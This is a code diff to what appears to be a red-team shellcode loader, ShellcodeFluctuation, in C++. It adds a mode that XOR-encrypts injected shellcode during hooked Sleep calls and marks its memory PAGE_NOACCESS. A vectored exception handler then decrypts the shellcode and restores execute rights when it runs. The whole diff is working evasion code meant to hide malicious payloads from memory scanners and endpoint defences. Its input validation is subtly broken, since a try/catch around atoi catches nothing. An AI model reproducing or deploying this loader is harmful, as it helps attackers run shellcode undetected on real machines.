@@ -5,7 +5,7 @@
 
 HookedSleep g_hookedSleep;
 FluctuationMetadata g_fluctuationData;
-bool g_fluctuate = false;
+TypeOfFluctuation g_fluctuate;
 
 
 void WINAPI MySleep(DWORD dwMilliseconds)
@@ -42,10 +42,21 @@ void WINAPI MySleep(DWORD dwMilliseconds)
     // Perform sleep emulating originally hooked functionality.
     ::Sleep(dwMilliseconds);
 
-    //
-    // Decrypt (XOR32) shellcode's memory allocation and flip its memory pages back to RX
-    //
-    shellcodeEncryptDecrypt(caller);
+    if (g_fluctuate == FluctuateToRW)
+    {
+        //
+        // Decrypt (XOR32) shellcode's memory allocation and flip its memory pages back to RX
+        //
+        shellcodeEncryptDecrypt((LPVOID)caller);
+    }
+    else
+    {
+        //
+        // If we fluctuate to PAGE_NOACCESS there is no need to decrypt and revert back memory protections just yet.
+        // We await for Access Violation exception to occur, catch it and from within the exception handler will adjust 
+        // its protection to resume execution.
+        //
+    }
 
     //
     // Re-hook kernel32!Sleep
@@ -82,7 +93,7 @@ std::vector<MEMORY_BASIC_INFORMATION> collectMemoryMap(HANDLE hProcess, DWORD Ty
 
 void initializeShellcodeFluctuation(const LPVOID caller)
 {
-    if (g_fluctuate && g_fluctuationData.shellcodeAddr == nullptr && isShellcodeThread(caller))
+    if ((g_fluctuate != NoFluctuation) && g_fluctuationData.shellcodeAddr == nullptr && isShellcodeThread(caller))
     {
         auto memoryMap = collectMemoryMap(GetCurrentProcess());
 
@@ -100,7 +111,6 @@ void initializeShellcodeFluctuation(const LPVOID caller)
                 //
                 g_fluctuationData.shellcodeAddr = mbi.BaseAddress;
                 g_fluctuationData.shellcodeSize = mbi.RegionSize;
-                g_fluctuationData.protect = mbi.Protect;
                 g_fluctuationData.currentlyEncrypted = false;
 
                 std::random_device dev;
@@ -116,7 +126,7 @@ void initializeShellcodeFluctuation(const LPVOID caller)
                 log("    Shellcode resides at 0x", 
                     std::hex, std::setw(8), std::setfill('0'), mbi.BaseAddress, 
                     " and occupies ", std::dec, mbi.RegionSize, 
-                    " bytes. XOR32 key: 0x", std::hex, std::setw(8), std::setfill('0'), g_fluctuationData.encodeKey);
+                    " bytes. XOR32 key: 0x", std::hex, std::setw(8), std::setfill('0'), g_fluctuationData.encodeKey, "\n");
 
                 return;
             }
@@ -154,9 +164,10 @@ bool isShellcodeThread(LPVOID address)
         //
         if (mbi.Type == MEM_PRIVATE)
         {
-            return ((mbi.Protect & PAGE_EXECUTE_READWRITE)
-                || (mbi.Protect & PAGE_EXECUTE_READ)
-                || (mbi.Protect == PAGE_READWRITE));
+            const DWORD expectedProtection = (g_fluctuate == FluctuateToRW) ? PAGE_READWRITE : PAGE_NOACCESS;
+
+            return ((mbi.Protect & Shellcode_Memory_Protection)
+                || (mbi.Protect & expectedProtection));
         }
     }
 
@@ -230,6 +241,15 @@ bool fastTrampoline(bool installHook, BYTE* addressToHook, LPVOID jumpAddress, H
         }
     }
 
+    static typeNtFlushInstructionCache pNtFlushInstructionCache = NULL;
+    if (!pNtFlushInstructionCache)
+    {
+        pNtFlushInstructionCache = (typeNtFlushInstructionCache)GetProcAddress(GetModuleHandleA("ntdll"), "NtFlushInstructionCache");
+    }
+
+    pNtFlushInstructionCache(GetCurrentProcess(), addressToHook, dwSize);
+
+
     ::VirtualProtect(
         addressToHook,
         dwSize,
@@ -256,28 +276,27 @@ bool hookSleep()
 
 void shellcodeEncryptDecrypt(LPVOID callerAddress)
 {
-    if (g_fluctuate && g_fluctuationData.shellcodeAddr != nullptr && g_fluctuationData.shellcodeSize > 0)
+    if ((g_fluctuate != NoFluctuation) && g_fluctuationData.shellcodeAddr != nullptr && g_fluctuationData.shellcodeSize > 0)
     {
         if (!isShellcodeThread(callerAddress))
             return;
 
         DWORD oldProt = 0;
 
-        if (!g_fluctuationData.currentlyEncrypted)
+        if (!g_fluctuationData.currentlyEncrypted 
+            || (g_fluctuationData.currentlyEncrypted && g_fluctuate == FluctuateToNA))
         {
             ::VirtualProtect(
                 g_fluctuationData.shellcodeAddr,
                 g_fluctuationData.shellcodeSize,
                 PAGE_READWRITE,
-                &g_fluctuationData.protect
+                &oldProt
             );
 
-            log("[>] Flipped to RW. Encoding...");
+            log("[>] Flipped to RW.");
         }
-        else
-        {
-            log("[.] Decoding...");
-        }
+        
+        log((g_fluctuationData.currentlyEncrypted) ? "[<] Decoding..." : "[>] Encoding...");
 
         xor32(
             reinterpret_cast<uint8_t*>(g_fluctuationData.shellcodeAddr),
@@ -285,20 +304,81 @@ void shellcodeEncryptDecrypt(LPVOID callerAddress)
             g_fluctuationData.encodeKey
         );
 
-        if (g_fluctuationData.currentlyEncrypted)
+        if (!g_fluctuationData.currentlyEncrypted && g_fluctuate == FluctuateToNA)
+        {
+            //
+            // Here we're utilising ORCA666's idea to mark the shellcode as PAGE_NOACCESS instead of PAGE_READWRITE
+            // and our previously set up vectored exception handler should catch invalid memory access, flip back memory
+            // protections and resume the execution.
+            // 
+            // Be sure to check out ORCA666's original implementation here:
+            //      https://github.com/ORCA666/0x41/blob/main/0x41/HookingLoader.hpp#L285
+            //
+
+            ::VirtualProtect(
+                g_fluctuationData.shellcodeAddr,
+                g_fluctuationData.shellcodeSize,
+                PAGE_NOACCESS,
+                &oldProt
+            );
+
+            log("[>] Flipped to No Access.\n");
+        }
+        else if (g_fluctuationData.currentlyEncrypted)
         {
             ::VirtualProtect(
                 g_fluctuationData.shellcodeAddr,
                 g_fluctuationData.shellcodeSize,
-                g_fluctuationData.protect,
+                Shellcode_Memory_Protection,
                 &oldProt
             );
 
-            log("[>] Flipped to RX.");
+            log("[<] Flipped to RX.\n");
         }
 
         g_fluctuationData.currentlyEncrypted = !g_fluctuationData.currentlyEncrypted;
     }
+}
+
+LONG NTAPI VEHHandler(PEXCEPTION_POINTERS pExceptInfo)
+{
+    if (pExceptInfo->ExceptionRecord->ExceptionCode == 0xc0000005)
+    {
+#ifdef _WIN64
+        ULONG_PTR caller = pExceptInfo->ContextRecord->Rip;
+#else
+        ULONG_PTR caller = pExceptInfo->ContextRecord->Eip;
+#endif
+
+        log("[.] Access Violation occured at 0x", std::hex, std::setw(8), std::setfill('0'), caller);
+
+        //
+        // Check if the exception's instruction pointer (EIP/RIP) points back to our shellcode allocation.
+        // If it does, it means our shellcode attempted to run but was unable to due to the PAGE_NOACCESS.
+        //
+        if ((caller >= (ULONG_PTR)g_fluctuationData.shellcodeAddr)
+            && (caller <= ((ULONG_PTR)g_fluctuationData.shellcodeAddr + g_fluctuationData.shellcodeSize)))
+        {
+            log("[+] Shellcode wants to Run. Restoring to RX and Decrypting\n");
+
+            //
+            // We'll now decrypt (XOR32) shellcode's memory allocation and flip its memory pages back to RX.
+            //
+            shellcodeEncryptDecrypt((LPVOID)caller);
+
+            //
+            // Tell the system everything's OK and we can carry on.
+            //
+            return EXCEPTION_CONTINUE_EXECUTION;
+        }
+    }
+
+    log("[.] Unhandled exception occured. Not the one due to PAGE_NOACCESS :(");
+
+    //
+    // Oops, something else just happened and that wasn't due to our PAGE_NOACCESS trick.
+    //
+    return EXCEPTION_CONTINUE_SEARCH;
 }
 
 bool readShellcode(const char* path, std::vector<uint8_t>& shellcode)
@@ -406,13 +486,23 @@ int main(int argc, char** argv)
         log("Usage: ShellcodeFluctuation.exe <shellcode> <fluctuate>");
         log("<fluctuate>:\n\t-1 - Read shellcode but dont inject it. Run in an infinite loop.");
         log("\t0 - Inject the shellcode but don't hook kernel32!Sleep and don't encrypt anything");
-        log("\t1 - Inject shellcode and start fluctuating its memory.");
+        log("\t1 - Inject shellcode and start fluctuating its memory with standard PAGE_READWRITE.");
+        log("\t2 - Inject shellcode and start fluctuating its memory with ORCA666's PAGE_NOACCESS.");
         return 1;
     }
 
     std::vector<uint8_t> shellcode;
-    bool dontInject = !strcmp(argv[2], "-1");
-    if(!dontInject) g_fluctuate = (!strcmp(argv[2], "true") || !strcmp(argv[2], "1"));
+
+    try
+    {
+        // Don't you play tricks with values outside of this enum, I'm feeling like catching all your edge cases...
+        g_fluctuate = (TypeOfFluctuation)atoi(argv[2]);
+    }
+    catch (...)
+    {
+        log("[!] Invalid <fluctuate> mode provided");
+        return 1;
+    }
 
     log("[.] Reading shellcode bytes...");
     if (!readShellcode(argv[1], shellcode))
@@ -421,7 +511,7 @@ int main(int argc, char** argv)
         return 1;
     }
 
-    if (g_fluctuate)
+    if (g_fluctuate != NoFluctuation)
     {
         log("[.] Hooking kernel32!Sleep...");
         if (!hookSleep())
@@ -435,11 +525,17 @@ int main(int argc, char** argv)
         log("[.] Shellcode will not fluctuate its memory pages protection.");
     }
 
-    if (dontInject)
+    if (g_fluctuate == NoFluctuation)
     {
         log("[.] Entering infinite loop (not injecting the shellcode) for memory IOCs examination.");
         log("[.] PID = ", std::dec, GetCurrentProcessId());
         while (true) {}
+    }
+    else if (g_fluctuate == FluctuateToNA)
+    {
+        log("\n[.] Initializing VEH Handler to intercept invalid memory accesses due to PAGE_NOACCESS.");
+        log("    This is a re-implementation of ORCA666's work presented in his https://github.com/ORCA666/0x41 project.\n");
+        AddVectoredExceptionHandler(1, &VEHHandler);
     }
 
     log("[.] Injecting shellcode...");
